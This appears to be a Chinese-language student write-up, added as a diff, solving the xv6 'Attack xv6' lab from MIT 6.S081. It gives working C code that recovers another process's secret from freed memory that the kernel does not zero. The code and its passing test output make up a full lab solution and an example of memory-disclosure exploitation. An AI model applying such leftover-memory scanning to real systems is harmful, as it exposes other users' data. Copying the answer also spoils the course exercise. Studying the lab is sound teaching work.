@@ -738,3 +738,146 @@ ALL TESTS PASSED
 通过测试。
 
 ### Attack xv6 ([moderate](https://pdos.csail.mit.edu/6.S081/2024/labs/guidance.html))
+
+> `user/secret.c` writes an 8-byte secret in its memory and then exits (which frees its memory). Your goal is to add a few lines of code to `user/attack.c` to find the secret that a previous execution of `secret.c` wrote to memory, and write the 8 secret bytes to file descriptor 2. You'll receive full credit if `attacktest` prints: "OK: secret is ebb.ebb". (Note: the secret may be different for each run of `attacktest`.) 
+> `user/secret.c` 在其内存中写入一个 8 字节的秘密，然后退出（这会释放其内存）。你的目标是在 `user/attack.c` 中添加几行代码，以找到之前执行的 `secret.c` 写入内存的秘密，并将这 8 个秘密字节写入文件描述符 2。如果 `attacktest` 打印出：“OK: secret is ebb.ebb”，你将获得满分。（注意：每次运行 `attacktest` 时，秘密可能不同。）
+> 
+> You are allowed to modify `user/attack.c`, but you cannot make any other changes: you cannot modify the xv6 kernel sources, `secret.c`, `attacktest.c`, etc. 
+> 你可以修改 `user/attack.c` ，但不能进行其他更改：你不能修改 xv6 内核源代码、`secret.c`、`attacktest.c` 等。
+> 
+> The bug is that the call to `memset(mem, 0, sz)` at line 272 in `kernel/vm.c` to clear a newly-allocated page is omitted when compiling this lab. Similarly, when compiling `kernel/kalloc.c` for this lab the two lines that use `memset` to put garbage into free pages are omitted. The net effect of omitting these 3 lines (all marked by `ifndef LAB_SYSCALL`) is that newly allocated memory retains the contents from its previous use. 
+> 该漏洞在于编译此项目时，省略了在 `kernel/vm.c` 的第 272 行调用 `memset(mem, 0, sz)` 以清除新分配页面的操作。同样地，在为此实验编译 `kernel/kalloc.c` 时，使用 `memset` 将垃圾数据放入空闲页面的两行代码也被省略了。省略这三行（均标记为 `ifndef LAB_SYSCALL` ）的净效应是新分配的内存保留了其先前使用的内容。
+
+首先读一下`secret.c`的代码：
+
+```c
+#include "kernel/types.h"   // 定义基本数据类型（如uint）
+#include "kernel/fcntl.h"   // 文件控制相关宏
+#include "user/user.h"      // 用户态系统调用封装
+#include "kernel/riscv.h"   // RISC-V架构相关定义
+
+int main(int argc, char *argv[])
+{
+  // 参数校验：程序必须带1个参数（argv[0]是程序名）
+  if(argc != 2){
+    printf("Usage: secret the-secret\n");
+    exit(1);
+  }
+
+  // 内存操作：通过sbrk申请32页内存（每页4KB=4096字节）
+  char *end = sbrk(PGSIZE*32); // 总申请 32*4096=131072 字节
+  
+  // 指针运算：将end移动到第9页末尾
+  end = end + 9 * PGSIZE;      // 实际偏移 9*4096=36864 字节
+
+  // 字符串操作：在end位置写入固定前缀
+  strcpy(end, "my very very very secret pw is:   "); // 32字节
+  
+  // 在偏移32字节处写入用户输入的密码
+  strcpy(end+32, argv[1]);     // 拼接用户输入参数
+
+  exit(0); // 正常退出（但内存内容保留）
+}
+```
+
+涉及到内存的分配情况：
+
+```tex
+内存地址增长方向
+↑
+┌───────────────────────┐
+│      32页内存块        │ ← sbrk(PGSIZE*32)初始分配地址 (0x1000)
+├───────────────────────┤ 
+│       ...             │ （前8页未使用）
+├───────────────────────┤ ← end = 初始地址 + 9*PGSIZE (第9页起始位置)
+│    固定字符串32字节     │ ← strcpy(end, "my...")
+│   "my very very..."   │ 
+├───────────────────────┤
+│    用户密码8字节        │ ← strcpy(end+32, argv[1]) 
+│   (SECRET_LEN=8)      │
+├───────────────────────┤
+│    剩余未使用空间       │ 
+└───────────────────────┘ ← sbrk分配的内存顶部 (0x1000 + 32*4096)
+```
+
+即问题在于如何获取到写入密码的地址，最先想到的是尝试申请相同大小的内存分配，然后进行字符串匹配找到写密码的位置：
+
+```c
+#include "kernel/types.h"
+#include "kernel/fcntl.h"
+#include "user/user.h"
+#include "kernel/riscv.h"
+
+#define PATTERN "my very very very secret pw is:   "
+#define PAT_LEN 31
+#define SECRET_LEN 8
+
+int
+main(int argc, char *argv[])
+{
+  // your code here.  you should write the secret to fd 2 using write
+  // (e.g., write(2, secret, 8)
+  char *mem = sbrk(PGSIZE*32);
+  mem = mem + 9 * PGSIZE;
+  for (char *p = mem; p < mem + (PGSIZE*32 - PAT_LEN - SECRET_LEN); p++) {
+    int match = 1;
+    for (int i = 0; i < PAT_LEN; i++) {
+      if (p[i] != PATTERN[i]) {
+        match = 0;
+        break;
+      }
+    }
+    if (match) {
+      write(2, p + 32, SECRET_LEN);
+      exit(0);
+    }
+  }
+  exit(1);
+}
+```
+
+但是这种方式一直不对，去自学指南上看了下别人的问答，思路没问题，但是匹配的条件需要放宽一点，匹配一半即可：
+
+```c
+#include "kernel/types.h"
+#include "kernel/fcntl.h"
+#include "user/user.h"
+#include "kernel/riscv.h"
+
+#define PATTERN "my very very very secret pw is:   "
+#define PAT_LEN 31
+#define MIN_MATCH 16 
+#define SECRET_LEN 8
+
+int
+main(int argc, char *argv[])
+{
+  // your code here.  you should write the secret to fd 2 using write
+  // (e.g., write(2, secret, 8)
+  char *mem = sbrk(PGSIZE*32);
+  mem = mem + 9 * PGSIZE;
+  for (char *p = mem; p < mem + PGSIZE * 128; p++) {
+    int match_count = 0;
+    for (int i = 0; i < PAT_LEN; i++) {
+      if (p[i] == PATTERN[i]) {
+        if (++match_count >= MIN_MATCH) {
+          write(2, p + 32, SECRET_LEN);
+          exit(0);
+        }
+      } else {
+        match_count = 0;
+      }
+    }
+  }
+  exit(1);
+}
+```
+
+运行通过：
+
+```bash
+$ attacktest
+OK: secret is e.ddfee
+```
+
+到此Lab2就做完了。
